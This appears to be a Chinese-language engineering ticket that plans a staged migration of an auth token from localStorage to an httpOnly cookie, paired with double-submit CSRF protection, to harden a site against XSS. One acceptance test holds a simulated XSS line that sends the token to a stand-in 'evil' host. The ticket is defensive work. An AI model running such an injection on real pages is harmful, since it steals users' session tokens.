# 工单 · SEC-XSS 阶段3：token 从 localStorage 迁 httpOnly Cookie（Issue #194）

> 供其他 agent 独立执行。先读《工单-其他agent实施》§0 +《任务看板》+《开发手册》+《工单-前端XSS加固-20260706.md》。
> **冲突组（跨组大工程，分步逐个抢锁）：D（`server/auth_server.py`）+ A（`server/content_domains/**`）+ 各后端服务（leadgen/imggen/dl/admin/tikhub）+ 多前端页（`site/workbench/**`、`login.html`）+ shell（`cloud-shell.js`、`auth-guard.js`）**。
> ⚠️ 这是**认证机制改造**，全站 token 校验都受影响，**必须分步 + 每步可回滚 + 双读兼容**，禁止一把梭。
> 相关：#194（前端XSS）；阶段1（统一转义器#194）、阶段2（CSP #255）已上线，本阶段是 XSS 防线的最后一环。

## 目标
`hq_token` 从 **localStorage（JS 可读，XSS 能偷）** 迁到 **httpOnly Cookie（JS 读不到，XSS 偷不走）**。即使页面被 XSS 注入，攻击者也拿不到用户 token。

## 现状（已排查 2026-07-07）
- **登录下发**：`auth_server.py:378 issue_token()` 生成 token → login.html:225 `localStorage.setItem("hq_token",token)`。
- **前端使用**：~13 个文件、18 处引用 `localStorage.getItem('hq_token')`，作为 `Authorization: Bearer <token>` 头发出（含 auth-guard.js、cloud-shell.js、各 workbench 页）。
- **后端校验**：`content_domains/core.py:774 _token()`（读 Bearer 头）→ `verify()` 调 auth `/api/auth/me`。**7 个服务都验 token**：auth_server、content(core)、leadgen_api、imggen_api、dl_service、admin_api、tikhub。
- **CSRF 现状**：目前靠 Bearer 头（JS 显式带），天然免疫 CSRF（跨站请求带不上自定义头）。**改 cookie 后 cookie 会自动带，必须补 CSRF 防护**，否则引入 CSRF 漏洞。

## ⚠️ 关键风险：改 cookie 会引入 CSRF
Bearer 头是"JS 显式带"，跨站页面带不上 → 无 CSRF。Cookie 是"浏览器自动带" → 恶意站点能借用户 cookie 发状态变更请求（充值/改密/删资产）。**所以迁 cookie 必须同时上 CSRF 防护**，二者不可分。

## 分步实施（每步独立 PR、可回滚、双读兼容）

### 步骤 1：后端双读（先做，纯兼容，零风险）— 组 A+D+各服务
所有验 token 处改成 **先读 Cookie `hq_token`，读不到再回退 Bearer 头**。此步不改前端、不改登录，线上行为完全不变（仍走 Bearer），只是**为后续 cookie 铺路**。
- `core.py:_token()`：`cookie.get('hq_token') or bearer_token(header)`。
- `auth_server.py:bearer_token()` 附近同理；leadgen/imggen/dl/admin/tikhub 各自的取 token 处同法。
- 加一个共用的 `_read_token(handler)` 帮助函数，避免每个服务各写一遍。

### 步骤 2：登录下发 httpOnly Cookie（双发）— 组 D
`auth_server.py` 登录/注册成功时，**除返回 token（暂留兼容）外，额外 Set-Cookie**：
```
Set-Cookie: hq_token=<token>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=<ttl>
```
- `HttpOnly`（JS 读不到）、`Secure`（仅 HTTPS）、`SameSite=Lax`（防大部分 CSRF，允许顶级导航）、`Path=/`。
- 登出：Set-Cookie 同名 Max-Age=0 清除。
- 此步后：cookie 已下发，后端双读已能认 cookie；前端仍用 localStorage（双轨并存，安全）。

### 步骤 3：CSRF 防护（与步骤2配套，必须）— 组 D+A
`SameSite=Lax` 挡住大部分跨站，但状态变更接口仍建议双重防护：
- 方案（推荐**双提交 Cookie**）：登录时另发一个**非 httpOnly** 的 `hq_csrf`（随机值，JS 可读）；前端所有**写操作**（POST/PUT/DELETE）带自定义头 `X-CSRF-Token: <hq_csrf>`；后端校验 header 的 csrf == cookie 的 csrf。跨站拿不到 cookie 值也就伪造不了 header。
- 或至少确保 `SameSite=Strict`（更严，但会影响外链跳转带 cookie，需评估登录态）。

### 步骤 4：前端改用 Cookie（逐页/分组）— 组 多前端页+shell
- 请求改 `fetch(url, {credentials:'include', headers:{'X-CSRF-Token':csrf}})`，**去掉 `Authorization: Bearer`**（或先保留，双轨）。
- `auth-guard.js` 登录态判断：不再读 localStorage token，改为"有 hq_csrf 或调 /api/auth/me 成功"。
- 逐页/按 lock/E-<页> 分组迁移，每页迁完实测该页功能（生成/下载/鉴权媒体加载都要过）。
- ⚠️ 鉴权媒体加载（video/audio/assets 的 `/api/gen/file` blob fetch）也要改 `credentials:'include'`，否则私有素材加载 401。

### 步骤 5：清理（全部迁完 + 观察稳定后）— 组 D+前端
- login.html 不再 `localStorage.setItem('hq_token')`；各页删 localStorage token 读取；后端登录不再返回明文 token（只发 cookie）。
- 保留双读一段时间再撤 Bearer 分支（防旧缓存页）。

## 验收标准
1. 登录后 `document.cookie` / `localStorage` **读不到 token**（httpOnly 生效，DevTools Application 里 hq_token 标 HttpOnly✓）。
2. 全站功能正常：登录/登出、各页生成、鉴权媒体（video/audio/assets 私有素材）加载、充值/改密/删资产等写操作。
3. **CSRF 防护生效**：构造跨站 POST（不带 X-CSRF-Token 或 csrf 不匹配）→ 被拒。
4. 模拟 XSS（在页面注入 `fetch('//evil/?t='+localStorage.hq_token)`）**偷不到 token**（localStorage 无 token、cookie httpOnly 读不到）。
5. 每步可独立回滚，回滚后线上不崩（双读兼容是命根子）。

## 部署与验证
- **分步部署**：步骤1（后端双读，先上，无感）→ 步骤2/3（auth cookie+CSRF）→ 步骤4（前端逐页）→ 步骤5（清理）。每步 ship 对应文件 + 重启对应服务；前端页 ship 到 webroot。
- 每步实测：登录→各功能→注入用例。**后端改多服务的步骤要逐个重启并健康检查**（auth/content/leadgen/imggen/dl/admin）。
- 强烈建议：先在步骤1充分验证双读不影响现网，再动登录下发。

> 本工单只做规划，未改动任何文件。这是认证改造，**稳字当头、分步可回滚**，别图快一把改完。
